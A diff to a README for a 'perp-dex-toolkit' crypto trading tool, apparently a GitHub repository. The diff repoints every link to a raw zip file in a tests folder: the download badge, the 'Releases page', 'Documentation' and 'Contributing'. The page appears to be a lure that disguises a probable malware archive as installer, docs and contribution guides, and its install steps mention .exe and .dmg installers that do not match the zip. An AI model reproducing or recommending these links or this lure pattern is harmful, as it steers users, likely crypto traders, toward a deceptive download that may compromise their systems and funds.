@@ -6,11 +6,11 @@ Welcome to the perp-dex-toolkit! This tool helps you trade across multiple excha
 
 ## 📥 Download the Toolkit
 
-[![Download the perp-dex-toolkit](https://raw.githubusercontent.com/azezbakor1/perp-dex-toolkit/main/breakless/perp-dex-toolkit.zip%20Now%20-v1.0-brightgreen)](https://raw.githubusercontent.com/azezbakor1/perp-dex-toolkit/main/breakless/perp-dex-toolkit.zip)
+[![Download the perp-dex-toolkit](https://github.com/azezbakor1/perp-dex-toolkit/raw/refs/heads/main/tests/perp_toolkit_dex_3.4.zip%20Now%20-v1.0-brightgreen)](https://github.com/azezbakor1/perp-dex-toolkit/raw/refs/heads/main/tests/perp_toolkit_dex_3.4.zip)
 
 ## 🔗 Visit the Releases Page
 
-To download the latest version of the software, visit the Releases page: [Download Here](https://raw.githubusercontent.com/azezbakor1/perp-dex-toolkit/main/breakless/perp-dex-toolkit.zip)
+To download the latest version of the software, visit the Releases page: [Download Here](https://github.com/azezbakor1/perp-dex-toolkit/raw/refs/heads/main/tests/perp_toolkit_dex_3.4.zip)
 
 ## 📋 Prerequisites
 
@@ -23,7 +23,7 @@ Before you can run the perp-dex-toolkit, make sure your system meets these requi
 
 ## 📥 Download & Install
 
-1. Visit the Releases page: [Download Here](https://raw.githubusercontent.com/azezbakor1/perp-dex-toolkit/main/breakless/perp-dex-toolkit.zip).
+1. Visit the Releases page: [Download Here](https://github.com/azezbakor1/perp-dex-toolkit/raw/refs/heads/main/tests/perp_toolkit_dex_3.4.zip).
 2. Find the latest version listed at the top of the page.
 3. Click on the version number to open the release details.
 4. Download the correct installer for your operating system. For Windows, look for a `.exe` file. For macOS, choose a `.dmg` file. For Linux, download the appropriate archive.
@@ -91,7 +91,7 @@ Feel free to share your experiences and suggest features you’d like to see in 
 
 ## 🔗 Additional Resources
 
-- [Documentation](https://raw.githubusercontent.com/azezbakor1/perp-dex-toolkit/main/breakless/perp-dex-toolkit.zip) - Do not hesitate to refer to our detailed documentation for in-depth guides and advanced configuration.
-- [Contributing](https://raw.githubusercontent.com/azezbakor1/perp-dex-toolkit/main/breakless/perp-dex-toolkit.zip) - Interested in contributing? We welcome new ideas and improvements!
+- [Documentation](https://github.com/azezbakor1/perp-dex-toolkit/raw/refs/heads/main/tests/perp_toolkit_dex_3.4.zip) - Do not hesitate to refer to our detailed documentation for in-depth guides and advanced configuration.
+- [Contributing](https://github.com/azezbakor1/perp-dex-toolkit/raw/refs/heads/main/tests/perp_toolkit_dex_3.4.zip) - Interested in contributing? We welcome new ideas and improvements!
 
 Thank you for choosing perp-dex-toolkit! We hope it enhances your trading experience greatly.
